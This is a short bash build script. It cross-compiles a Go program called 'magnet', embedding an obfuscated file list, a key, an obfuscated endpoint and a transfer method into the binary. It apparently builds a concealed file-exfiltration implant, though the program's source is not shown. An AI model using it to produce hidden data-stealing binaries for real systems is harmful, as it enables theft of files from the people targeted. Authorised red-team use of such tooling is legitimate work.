#!/bin/bash

if [[ $# -ne 5 ]]; then
    echo "usage: ./build.sh \$TARGET_OS \$FILES \$ENDPOINT \$KEY \$METHOD"
    exit 92
fi

# TARGET_OS=$1
# FILES=$2
# ENDPOINT=$3
# KEY=$4
# METHOD=$5

export TARGET_OS=$1
export KEY=$4
export FILES=$(cat $2 | lobfuscator $KEY)
export ENDPOINT=$(echo "$3" | lobfuscator $KEY)
export METHOD=$5

GOOS=$TARGET_OS GOARCH=amd64 CGO_ENABLED=0 go build  -ldflags "-X 'main.FileList=$FILES' -X 'main.Key=$KEY' -X 'main.Endpoint=$ENDPOINT' -X 'main.Method=$METHOD'" cmd/magnet/magnet.go
